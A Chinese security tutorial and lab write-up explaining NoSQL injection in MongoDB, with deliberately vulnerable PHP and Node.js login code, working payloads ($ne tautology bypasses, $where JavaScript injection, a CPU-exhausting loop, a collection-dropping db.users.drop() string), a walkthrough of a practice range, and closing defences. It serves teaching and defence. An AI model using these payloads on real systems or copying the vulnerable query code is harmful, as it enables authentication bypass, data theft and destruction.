@@ -1,0 +1,567 @@
+# 冷门知识 — NoSQL注入知多少
+
+阅读量 **546955**
+
+|评论 **3**
+
+发布时间 : 2018-02-02 10:00:48
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：pockr.org
+
+原文地址：[https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0](https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0)
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+基本概念还是相当重要的，来看下owasp对NoSQL注入的描述。
+
+NoSQL数据库提供比传统SQL数据库更宽松的一致性限制。 通过减少关系约束和一致性检查，NoSQL数据库提供了更好的性能和扩展性。
+然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式
+SQL语言中执行，所以潜在影响要大于传统SQL注入。
+
+NoSQL数据库的调用是使用应用程序的编程语言编写的，过滤掉常见的HTML特殊字符，如`<>＆;`不会阻止针对NoSQL的攻击。
+
+## NoSQL注入分类
+
+我找到了两种NoSQL注入分类的分类方式，第一种是按照语言的分类:PHP数组注入，js注入和mongo shell拼接注入等等。
+
+第二种是按照攻击机制分类:重言式，联合查询，JavaScript注入等等，这种分类方式很像SQL注入的分类方式。
+
+我们详细讨论下第二种分类方式:
+
+### **1) 重言式**
+
+又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。
+
+### **2) 联合查询**
+
+联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。
+
+### **3) JavaScript注入**
+
+这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。
+
+## PHP中的NoSQL注入
+
+在我搜集NoSQL注入的时候发现了一个叫NoSQLInjectionAttackDemo的Github
+repo，感谢前辈的辛苦研究，给我提供了很宝贵的资料，我基于这个项目分析PHP中的NoSQL注入。
+
+### **1) 重言式注入**
+
+    
+    
+    <?php
+    $m = new MongoClient();
+    $db = $m->test;
+    $collection = $db->users;
+    $dbUsername = null;
+    $dbPassword = null;
+    $data = array(
+    'username' => $_REQUEST['username'],
+    'password' => $_REQUEST['password']
+    
+    ); 
+    $cursor = $collection->find($data);
+    $count = $cursor->count();
+    $doc_failed = new DOMDocument();
+    $doc_failed->loadHTMLFile("failed.html");
+    $doc_succeed = new DOMDocument();
+    $doc_succeed->loadHTMLFile("succeed.html");
+    if($count >0 ){
+    echo $doc_succeed->saveHTML();
+    foreach ($cursor as $user){
+    echo 'username:'.$user['username']."</br>";
+    echo 'password:'.$user['password']."</br>";
+    }
+    }
+    else{
+    echo $doc_failed->saveHTML();
+    }
+
+这段代码有点年代，我试图运行的时候发现，这个MongoDB driver已经不推荐使用了。
+
+![](https://p2.ssl.qhimg.com/t011cfa6c4337f0143b.png)
+
+为了文章的实用性，我用最新的MongoDB driver重构了这段代码。
+
+    
+    
+    <?php
+    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
+    $dbUsername = null;
+    $dbPassword = null;
+    $data = array(
+    'username' => $_REQUEST['username'],
+    'password' => $_REQUEST['password']
+    
+    ); 
+    $query = new MongoDB\Driver\Query($data);
+    $cursor = $manager->executeQuery('test.users', $query)->toArray();
+    $doc_failed = new DOMDocument();
+    $doc_failed->loadHTMLFile("failed.html");
+    $doc_succeed = new DOMDocument();
+    $doc_succeed->loadHTMLFile("succeed.html");
+    if(count($cursor)>0){
+    echo $doc_succeed->saveHTML();
+    }
+    else{
+    echo $doc_failed->saveHTML();
+    }
+
+很简单，就是一个登录的后端处理代码，正常情况下，输入正确的用户名和密码我们可以看到登录成功的页面，输入错误的看到登录失败的页面。
+
+我们正常登录来详细看一下程序的数据流，假设用户名:xiaoming 密码:xiaoming123
+
+![](https://p3.ssl.qhimg.com/t0195e4801bf1734ef7.png)
+
+我们从代码中可以看出，这里对用户输入没有做任何校验，那么我们可以通过构造一个永真的条件就可以完成NoSQL注入。MongoDB基础我在本文不再赘述，直接构造payload:username[$ne]=1&password[$ne]=1的payload.
+
+![](https://p1.ssl.qhimg.com/t01c869590f618aa648.gif)
+
+注入成功，看数据流:
+
+![](https://p2.ssl.qhimg.com/t01de27d801a1d96b27.png)
+
+对于PHP本身的特性而言，由于其松散的数组特性，导致如果我们输入value=1那么，也就是输入了一个value的值为1的数据。如果输入value[$ne]=1也就意味着value=array($ne=>1),在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用username[$gt]=&password[$gt]=作为payload进行攻击。
+
+###  **2)** **NoSQL联合查询注入**
+
+我们都知道在SQL时代拼接字符串容易造成SQL注入，NoSQL也有类似问题，但是现在无论是PHP的MongoDB
+driver还是node.js的mongoose都要求查询条件必须是一个数组或者对象了，因此简单看一下就好。
+
+    
+    
+    string query ="{ username: '" + post_username + "', password: '" + post_password + "' }"
+
+payload:
+
+    
+    
+    username=tolkien', $or: [ {}, { 'a':'a&password=' } ]
+
+### **3) JavaScript注入**
+
+* $where操作符
+
+在MongoDB中 $where操作符是可以执行JavaScript语句的,在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性，如db，看到这里，如果你有在生产环境中使用MongoDB
+2.4之前的MongoDB版本，赶快放下手里的事情去升级吧。
+
+我们继续用代码说话，后面的代码我将直接使用新版MongoDB driver作为示例。
+
+    
+    
+    <?php
+    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
+    $query_body =array(
+    '$where'=>"
+    function q() {
+    var username = ".$_REQUEST["username"].";
+    var password = ".$_REQUEST["password"].";if(username == 'admin'&&password == '123456') return true; else{ return false;}}
+    "); 
+    $query = new MongoDB\Driver\Query($query_body);
+    $cursor = $manager->executeQuery('test.users', $query)->toArray();
+    $doc_failed = new DOMDocument();
+    $doc_failed->loadHTMLFile("failed.html");
+    $doc_succeed = new DOMDocument();
+    $doc_succeed->loadHTMLFile("succeed.html");
+    if(count($cursor)>0){
+    echo $doc_succeed->saveHTML();
+    }
+    else{
+    echo $doc_failed->saveHTML();
+    }
+
+还是那个登录，这次我们指定了用户名和密码，假设我们不知道用户名和密码，使用payload：username=1&password=1;return
+true;进行注入攻击。
+
+![](https://p5.ssl.qhimg.com/t018cc0c5d80409eac2.gif)
+
+注入成功，继续看数据流:
+
+![](https://p5.ssl.qhimg.com/t01e44a044a2ee806c2.png)
+
+对于这个$where操作符注入还有一个好玩的payload 。
+
+    
+    
+    username=1&password=1;(function(){var%20date%20=%20new%20Date();%20do{curDate%20=%20new%20Date();}while(curDate-date%3C5000);%20return%20Math.max();})();
+
+这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。
+
+![](https://mmbiz.qpic.cn/mmbiz_gif/QVPRT3UXRyticl59chpSBEB3VNxKcfNLbeH4zn5icib0yOqc13ykRWialWCicc6ibUkTfdmAo4LICO5HuOxP8gx9PggQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)
+
+注意docker进程的cpu占用变化
+
+* 使用Command方法构成注入
+
+MongoDB
+driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:
+
+    
+    
+    <?php
+    $m = new MongoDB\Driver\Manager;
+    // Don't do this!!!
+    $username = $_GET['field']; 
+    // $username is set to "'); db.users.drop(); print('"$cmd = new \MongoDB\Driver\Command( [
+    'eval' => "print('Hello, $username!');"
+    ] );
+    
+    $r = $m->executeCommand( 'dramio', $cmd );?>
+
+但是我实在不知道有人会用print干什么，(为了记日志？)继续搜索，直到我看到了有人喜欢用Command去实现Mongo的distinct方法，于是照猫画虎构建了这样的例子。
+
+    
+    
+    <?php
+    $manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
+    $username = $_REQUEST['username'];
+    $cmd = new MongoDB\Driver\Command([
+    // build the 'distinct' command
+    'eval'=> "db.users.distinct('username',{'username':'$username'})"
+    ]);
+    $cursor = $manager->executeCommand('test', $cmd)->toArray();
+    var_dump($cursor);
+    $doc_failed = new DOMDocument();
+    $doc_failed->loadHTMLFile("failed.html");
+    $doc_succeed = new DOMDocument();
+    $doc_succeed->loadHTMLFile("succeed.html");
+    if(count($cursor)>0){
+    echo $doc_succeed->saveHTML();
+    }
+    else{
+    echo $doc_failed->saveHTML();
+    }
+
+这个就危险太多了，就相当于把mongo shell开放给用户了，你基本可以构建任何mongo
+shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建
+
+payload:username=2′});db.users.drop();db.user.find({‘username’:’2
+
+![](https://p5.ssl.qhimg.com/t01115e4ef8afc1a0bf.gif)
+
+整个users collection都不见了。继续看数据流：
+
+![](https://p3.ssl.qhimg.com/t01a7b04d4c8579f0d8.png)
+
+但我们也同时发现，构建这样的payload是有一定难度的，需要我们对MongoDB，JavaScript和业务都有足够的了解，这也是NoSQL注入的局限性。类似的操作还有mapReduce，那个更复杂一些,但原理类似，我就不再举例子了。
+
+至此，几种常见的NoSQL注入已经用PHP语言解释完了，那么对于和MongoDB天生般配的JavaScript有没有类似问题呢？
+
+## Node.js中的NoSQL注入
+
+PHP是第一次写，到了JavaScript这里就到了我熟悉的领域了。我们继续看代码。
+
+    
+    
+    var express = require('express');
+    var mongoose = require('mongoose');
+    var bodyParser = require('body-parser');
+    mongoose.connect('mongodb://localhost/test', { useMongoClient: true });
+    var UserSchema = new mongoose.Schema({
+    name: String,
+    username: String,
+    password: String
+    });
+    var User = mongoose.model('users', UserSchema);
+    var app = express();
+    app.set('views', __dirname);
+    app.set('view engine', 'jade');
+    
+    app.get('/', function(req, res) {
+    res.render('index', {});
+    });
+    
+    app.use(bodyParser.json()); 
+    
+    app.post('/', function(req, res) {
+    console.log(req.body)
+    User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
+    console.log(user)
+    if (err) {
+    return res.render('index', {message: err.message});
+    }
+    if (!user) {
+    return res.render('index', {message: 'Sorry!'});
+    }
+    
+    return res.render('index', {message: 'Welcome back ' + user.name + '!!!'});
+    });
+    });
+    
+    var server = app.listen(49090, function () {
+    console.log('listening on port %d', server.address().port);
+    });
+
+和PHP类似，构建这样的payload：
+
+    
+    
+    POST http://127.0.0.1:49090/
+    HTTP/1.1Content-Type: application/json{
+    "username": {"$ne": null},"password": {"$ne": null}}
+
+注入成功登陆系统。
+
+![](https://p0.ssl.qhimg.com/t01ee7cc173e1029c59.png)
+
+从例子可以看出JavaScript的注入方式和PHP的类似，剩下的注入形式和其他语言的实现方式我就不一一列举了，大家有兴趣去写写漏洞，既能了解漏洞产生原理也能在开发过程中避免类似问题。
+
+## NoSQL注入靶场
+
+为了让大家对NoSQL注入都有所了解，某运营小姐姐提议我写个靶场，当然因为这个靶场不只是NoSQL注入，还组合了很多好玩的且程序员容易忽略的点，我也受益匪浅，有兴趣的可以先去靶场试试。
+
+靶场链接：
+
+<https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035>
+
+整个代码用我比较熟悉的node.js+angular2实现，模拟一个需要用工号验证注册的内部系统，注册后可以查看和管理服务器，我把其中和NoSQL注入相关的拿出来说一下。
+
+### **1）工号注册绕过**
+
+来看用户注册部分的代码:
+
+    
+    
+    function create(userParam) {
+    var deferred = Q.defer();
+    console.log('userParam.jobnumber',userParam.jobnumber);
+    
+    // validation
+    
+    if(userParam.username =="admin"){
+    
+    deferred.reject('用户名 admin 不允许注册');
+    }
+    db.jobNumbers.findOne(
+    { jobNumber: userParam.jobnumber },
+    function (err, user) {
+    if (err) deferred.reject(err.name + ': ' + err.message);console.log('user',user);
+    if (!user) {// jobnumber already existsdeferred.reject('工号 "' + userParam.jobnumber + '"不存在');
+    } else {
+    const jobNumberArray=['puokr001','puokr002','puokr003','puokr004','puokr005','puokr006','puokr007','puokr008','puokr009','puokr010','puokr011',];
+    if(jobNumberArray.indexOf(userParam.jobnumber)>=0){
+    deferred.reject('工号 "' + userParam.jobnumber + '"已被注册');
+    }
+    
+    db.users.findOne(
+    { username: userParam.username },
+    function (err, user) {
+    if (err) deferred.reject(err.name + ': ' + err.message);
+    if (user) {// username already existsdeferred.reject('用户名 "' + userParam.username + '" 已存在');
+    } else {
+    createUser();
+    }
+    });
+    }
+    });function createUser() {
+    // set user object to userParam without the cleartext password
+    
+    var user = _.omit(userParam, ['password','jobnumber']);
+    
+    // add hashed password to user object
+    user.hash = bcrypt.hashSync(userParam.password, 10);
+    
+    db.users.insert(
+    user,
+    function (err, doc) {
+    if (err) deferred.reject(err.name + ': ' + err.message);
+    
+    deferred.resolve();
+    });
+    
+    createOwnServer();
+    }
+
+主要问题在这段代码中
+
+    
+    
+    db.jobNumbers.findOne(
+    { jobNumber: userParam.jobnumber },function (err, user) {...})
+
+由于`userParam.jobnumber`没有做任何校验，我们直接构建payload绕过工号校验直接注册:
+
+    
+    
+    {"username": "test","password": "111111","jobnumber": {"$ne": null}
+    
+    }
+
+![](https://p3.ssl.qhimg.com/t018e88dbcaefb45993.gif)
+
+注册后直接登录系统，即可看到服务器列表。
+
+![](https://p3.ssl.qhimg.com/t01ed8dbc79197cf66b.gif)
+
+### **2）越权查看管理员服务器**
+
+这是第二个注入点，在登录进去后的服务器列表页面中其实给了相应的提示:你负责的测试服务器都会在这里展示，生产服务器请联系管理员获取，也就是说我们是看不到管理员服务器的，但他们应该在数据库中。
+
+在前端console中，我故意打出了这样的数据结构(console中直接打印出数据结构也是程序员经常疏忽的点):
+
+![](https://p2.ssl.qhimg.com/t01314fe36d2752b392.png)
+
+从中可以看出服务器的owner是以数组的形式存的。然后我们为了过滤掉admin服务器，只显示自己的和public服务器，用了`$where`语句，并使用JavaScript语句进行过滤，比较常见的过滤方式是判断字符串的indexOf。那么我们尝试闭合indexOf，构造payload，这一步确实要对MongoDB和JavaScript都比较了解才能做出。
+
+还是一脸懵逼？直接看代码吧：
+
+    
+    
+    function getServers(username){
+    var deferred = Q.defer();
+    db.servers.find({$where:"function(){return ((this.owners.indexOf('admin')<0 && this.owners.indexOf('"+username+"')>=0))|| this.owners.indexOf('public')>=0 }" }).toArray(
+    function (err, servers) {
+    if (err) deferred.reject(err.name + ': ' + err.message);console.log(servers);
+    
+    deferred.resolve(servers);
+    });
+    return deferred.promise;
+    }
+
+同样的，username没有进行任何校验，看着代码构造payload，该闭合的闭合，保证JavaScript不报错还要和admin有关，构造条件让查询条件中包含admin且为真。
+
+payload:`')>0|| this.owners.indexOf('admin`。
+
+![](https://p4.ssl.qhimg.com/t017023e3284616d1aa.gif)
+
+靶场上线一段时间后，”summ3rf”同学给了我这样的一个思路:
+
+payload:
+
+    
+    
+    "username":"summ3rf)))});//"
+
+这样就即全部闭合了前面的代码，又不用考虑闭合后面的代码，感谢”summ3rf”同学，如果你能看到这篇文章，可以联系我共同探讨注入姿势~
+
+完整靶场Writeup：[靶场 | 冲云破雾冷门拖库Writeup](https://www.anquanke.com/post/id/95844)
+
+## 如何防止NoSQL注入
+
+从注入原理上看NoSQL注入的防护也很简单，思路也和SQL注入类似，我们只需要控制输入，禁止使用危险的操作就可以基本避免NoSQL注入。
+
+比如上面那个php例子
+
+    
+    
+    $data = array('username' => $_REQUEST['username'],'password' => $_REQUEST['password']
+    ); 
+    
+
+通过参数过滤就可以避免。
+
+    
+    
+    $data = array('username' => filter_var($_REQUEST['username']),'password' => filter_var($_REQUEST['password'])
+    ); 
+    
+
+对于JavaScript注入，`$where`
+和Commend方法能不用就尽量不要用了，如果必须用的话一定要限制输入或者把要执行的内容写成JavaScript function通过参数的方式传进去。
+
+    
+    
+    <?php$manager = new MongoDB\Driver\Manager("mongodb://mongo:27017");
+    $username = $_REQUEST['username'];
+    $cmd = new MongoDB\Driver\Command([
+    // build the 'distinct' command'eval'=> "function(username){db.users.distinct('username',{'username':' + username + '})}",
+    'args' => $username,
+    ]);
+    $cursor = $manager->executeCommand('test', $cmd)->toArray();
+    var_dump($cursor);
+    $doc_failed = new DOMDocument();
+    $doc_failed->loadHTMLFile("failed.html");
+    $doc_succeed = new DOMDocument();
+    $doc_succeed->loadHTMLFile("succeed.html");
+    if(count($cursor)>0){
+    echo $doc_succeed->saveHTML();
+    }
+    else{
+    echo $doc_failed->saveHTML();
+    }
+
+还有还有，不要轻易打开一些MongoDB相关的REST
+API，防止跨站请求伪造，给应用最小权限，不要存在未授权访问用户……(去年发生的MongoDB勒索事件还记忆犹新……)
+
+一份官方的security-checklist提供给大家参考：
+
+<https://docs.mongodb.com/manual/administration/security-checklist/>
+
+## 尾巴
+
+这篇文从代码层解释了一下NoSQL是如何形成的，还比较浅显，研究并没有结束，今后也许会研究如何稳定利用NoSQL注入，从驱动层解释NoSQL的形成，以及分享靶场搭建的脑洞和技术思路。感谢各位大牛、我的朋友们和破壳漏洞社区对我的支持。
+
+示例代码和靶场代码均已上传至Github：
+
+<https://github.com/bibotai/research_of_nosql_injection>
+
+## 参考
+
+[1] NoSQL注入的分析和缓解
+
+<http://www.yunweipai.com/archives/14084.html>
+
+[2] NoSQL Injection in MongoDB
+
+<https://zanon.io/posts/nosql-injection-in-mongodb>
+
+[3] Testing for NoSQL injection
+
+<https://www.owasp.org/index.php/Testing_for_NoSQL_injection>
+
+[4] 一个有趣的实例让NoSQL注入不再神秘
+
+<http://www.freebuf.com/articles/database/95314.html>
+
+[5] HACKING NODEJS AND MONGODB
+
+<https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html>
+
+[6] PHP Manaul for MongoDB: Script Injection Attacks
+
+<http://docs.php.net/manual/en/mongodb.security.script_injection.php>
+
+[7] No SQL! no injection? A talk on the state of NoSQL security
+
+<https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf>
+
+[8] GitHub:youngyangyang04/NoSQLInjectionAttackDemo
+
+<https://github.com/youngyangyang04/NoSQLInjectionAttackDemo>
+
+本文翻译自pockr.org
+[原文链接](https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **图南** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/97211](/post/id/97211)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[pockr.org](https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0)
+
+如若转载,请注明出处：
+[https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0](https://pockr.org/guest/activity?activity_no=act_761e1e744d8aa16823&speech_no=sp_26a751c506f61078b0)
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [NoSQL注入](/tag/NoSQL注入)
+
+ **+1** __6赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t01414d85afe79bc0dc.png) 图南
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
